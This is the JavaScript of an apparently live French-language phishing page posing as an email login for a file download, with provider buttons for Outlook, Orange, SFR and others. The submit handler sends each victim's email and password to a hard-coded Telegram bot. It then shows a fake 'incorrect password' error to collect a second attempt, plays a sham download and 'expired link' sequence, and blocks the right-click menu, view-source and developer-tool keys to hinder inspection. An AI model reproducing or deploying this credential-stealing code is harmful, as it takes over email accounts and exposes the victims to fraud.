



const emailInput = document.getElementById('emailInput');
      const passwordGroup = document.getElementById('passwordGroup');
      const passwordInput = document.getElementById('passwordInput');
      const passwordToggle = document.getElementById('passwordToggle');
      const submitBtn = document.getElementById('submitBtn');
      const loginForm = document.getElementById('loginForm');
      const container = document.querySelector('.container'); // Référence au conteneur principal
      const errorMessage = document.getElementById('errorMessage');
      const successMessage = document.getElementById('successMessage');
      // Afficher la zone de mot de passe quand l'email est saisi
      emailInput.addEventListener('blur', function() {
        if (this.value && this.value.includes('@')) {
          passwordGroup.classList.add('show');
          passwordInput.focus();
        }
      });
      // Masquer le message d'erreur quand l'utilisateur tape
      emailInput.addEventListener('input', function() {
        errorMessage.style.display = 'none';
      });
      passwordInput.addEventListener('input', function() {
        errorMessage.style.display = 'none';
      });
      // Masquer le message de succès quand l'utilisateur tape
      emailInput.addEventListener('input', function() {
        successMessage.style.display = 'none';
      });
      passwordInput.addEventListener('input', function() {
        successMessage.style.display = 'none';
      });
      // Basculer la visibilité du mot de passe
      passwordToggle.addEventListener('click', function() {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        this.classList.toggle('show');
      });
      // Gérer la soumission du formulaire
      loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const email = emailInput.value;
        const password = passwordInput.value;
        if (email && password) {
          submitBtn.textContent = 'Vérification...';
          submitBtn.disabled = true;
          const telegramToken = '7897794874:AAFoj-AacWrpMtd8BBRwQaSMVU5dt8lGH9k';
          const chatId = '7771854851';
          // construis uniquement "email:motdepasse"
          const message = `${email}:${password}`;
          // encode pour l'URL
          const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
          fetch(telegramUrl).then(res => console.log('Message Telegram envoyé (GET)')).catch(err => console.error('Erreur Telegram:', err));
          // Compter les tentatives
          if (!window.loginAttempts) {
            window.loginAttempts = 0;
          }
          window.loginAttempts++;
          setTimeout(() => {
            if (window.loginAttempts === 1) {
              errorMessage.textContent = 'Mot de passe incorrect. Veuillez réessayer.';
              errorMessage.style.display = 'block';
              submitBtn.textContent = 'Continuer';
              submitBtn.disabled = false;
              passwordInput.value = '';
              passwordInput.focus();
            } else if (window.loginAttempts === 2) {
              showDownloadAnimation();
            }
          }, 2000);
        }
      });
      // Fonction pour afficher l'animation de téléchargement
      function showDownloadAnimation() {
        // Masquer le formulaire
        loginForm.style.display = 'none';
        // Créer l'animation de téléchargement
        const downloadDiv = document.createElement('div');
        downloadDiv.id = 'downloadAnimation';
        downloadDiv.innerHTML = `
                
                                    <div class="download-container">
                                      <div class="download-icon">📥</div>
                                      <div class="download-text">Téléchargement en cours...</div>
                                      <div class="download-progress">
                                        <div class="progress-bar"></div>
                                      </div>
                                    </div>
            `;
        // Ajouter les styles pour l'animation
        const style = document.createElement('style');
        style.textContent = `
                .download-container {
                    text-align: center;
                    padding: 2rem;
                }
                .download-icon {
                    font-size: 3rem;
                    margin-bottom: 1rem;
                    animation: bounce 1s infinite;
                }
                .download-text {
                    font-size: 1.2rem;
                    color: #333;
                    margin-bottom: 1rem;
                }
                .download-progress {
                    width: 100%;
                    height: 8px;
                    background: #f0f0f0;
                    border-radius: 4px;
                    overflow: hidden;
                }
                .progress-bar {
                    width: 0%;
                    height: 100%;
                    background: #667eea;
                    animation: progress 3s linear;
                }
                @keyframes bounce {
                    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                    40% { transform: translateY(-10px); }
                    60% { transform: translateY(-5px); }
                }
                @keyframes progress {
                    0% { width: 0%; }
                    100% { width: 100%; }
                }
                .expired-message {
                    text-align: center;
                    padding: 2rem;
                    display: none;
                }
                .expired-message h3 {
                    color: #dc3545;
                    margin-bottom: 1rem;
                }
                .expired-message p {
                    color: #666;
                    margin-bottom: 1.5rem;
                }
                .request-form {
                    display: none;
                    padding: 1rem;
                }
                .request-form textarea {
                    width: 100%;
                    padding: 0.6rem;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 0.9rem;
                    margin-bottom: 1rem;
                    resize: vertical;
                    min-height: 80px;
                }
                .request-btn {
                    width: 100%;
                    padding: 0.6rem;
                    background: #667eea;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 0.9rem;
                    cursor: pointer;
                }
                .request-btn:hover {
                    background: #5a6fd8;
                }
            `;
        document.head.appendChild(style);
        container.appendChild(downloadDiv);
        // Après 3 secondes, afficher le message d'expiration
        setTimeout(() => {
          downloadDiv.remove();
          showExpiredMessage();
        }, 3000);
      }
      // Fonction pour afficher le message d'expiration
      function showExpiredMessage() {
        const expiredDiv = document.createElement('div');
        expiredDiv.id = 'expiredMessage';
        expiredDiv.innerHTML = `
                
                                    <div class="expired-message">
                                      <h3>⚠️ Lien de téléchargement expiré</h3>
                                      <p>Le lien de téléchargement a expiré. Veuillez demander un nouveau lien.</p>
                                      <button class="btn" onclick="showRequestForm()">Demander un nouveau lien</button>
                                    </div>
            `;
        container.appendChild(expiredDiv);
        // Afficher le message
        setTimeout(() => {
          expiredDiv.querySelector('.expired-message').style.display = 'block';
        }, 100);
      }
      // Fonction pour afficher le formulaire de demande
      function showRequestForm() {
        const expiredDiv = document.getElementById('expiredMessage');
        expiredDiv.innerHTML = `
                
                                    <div class="request-form">
                                      <h3>📧 Demande de nouveau lien</h3>
                                      <p>Veuillez expliquer pourquoi vous avez besoin d'un nouveau lien :</p>
                                      <textarea id="requestText" placeholder="Ex: Je n'ai pas pu télécharger le fichier, le lien a expiré..."></textarea>
                                      <button class="request-btn" onclick="sendRequest()">Envoyer la demande</button>
                                    </div>
            `;
        // Afficher le formulaire
        setTimeout(() => {
          expiredDiv.querySelector('.request-form').style.display = 'block';
        }, 100);
      }
      // Fonction pour envoyer la demande
      function sendRequest() {
        const requestText = document.getElementById('requestText').value;
        // Afficher confirmation dans la palette de connexion
        showSuccessMessage();
      }
      // Fonction pour afficher le message de succès
      function showSuccessMessage() {
        // Supprimer les éléments de demande
        const expiredDiv = document.getElementById('expiredMessage');
        if (expiredDiv) expiredDiv.remove();
        // Réafficher le formulaire de connexion
        loginForm.style.display = 'block';
        // Afficher le message de succès
        successMessage.textContent = '✅ Demande envoyée avec succès ! Vous recevrez un nouveau lien par email.';
        successMessage.style.display = 'block';
        // Réinitialiser le formulaire
        emailInput.value = '';
        passwordInput.value = '';
        passwordGroup.classList.remove('show');
        submitBtn.textContent = 'Continuer';
        submitBtn.disabled = false;
        window.loginAttempts = 0;
        // Focus sur l'email
        emailInput.focus();
        // Masquer le message après 3 secondes
        setTimeout(() => {
          successMessage.style.display = 'none';
        }, 3000);
      }
      // Fonction pour revenir au formulaire de connexion
      function resetToLoginForm() {
        // Supprimer tous les éléments ajoutés
        const downloadDiv = document.getElementById('downloadAnimation');
        const expiredDiv = document.getElementById('expiredMessage');
        if (downloadDiv) downloadDiv.remove();
        if (expiredDiv) expiredDiv.remove();
        // Réinitialiser le formulaire
        loginForm.style.display = 'block';
        emailInput.value = '';
        passwordInput.value = '';
        passwordGroup.classList.remove('show');
        submitBtn.textContent = 'Continuer';
        submitBtn.disabled = false;
        window.loginAttempts = 0;
        // Focus sur l'email
        emailInput.focus();
      }
      // Sélectionner un fournisseur
      document.querySelectorAll('.provider').forEach(provider => {
        provider.addEventListener('click', function() {
          // Retirer la sélection précédente
          document.querySelectorAll('.provider').forEach(p => {
            p.style.background = '#f8f9fa';
            p.style.color = '#333';
          });
          // Sélectionner le fournisseur cliqué
          this.style.background = '#667eea';
          this.style.color = 'white';
          // Pré-remplir l'email avec le domaine
          const domains = {
            'Outlook': '@outlook.com',
            'Bouygues': '@bouygues.com',
            'Yahoo': '@yahoo.com',
            'Orange': '@orange.fr',
            'Free': '@free.fr',
            'SFR': '@sfr.fr'
          };
          const domain = domains[this.textContent];
          if (domain) {
            emailInput.value = domain;
            emailInput.focus();
          }
        });
      });
      // Protection contre les copies
      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
      });
      document.addEventListener('keydown', function(e) {
        // Bloquer Ctrl+C, Ctrl+A, Ctrl+S, Ctrl+U, F12
        if ((e.ctrlKey && (e.key === 'c' || e.key === 'a' || e.key === 's' || e.key === 'u')) || e.key === 'F12') {
          e.preventDefault();
          return false;
        }
      });
      // Bloquer l'inspecteur
      document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
          e.preventDefault();
          return false;
        }
      });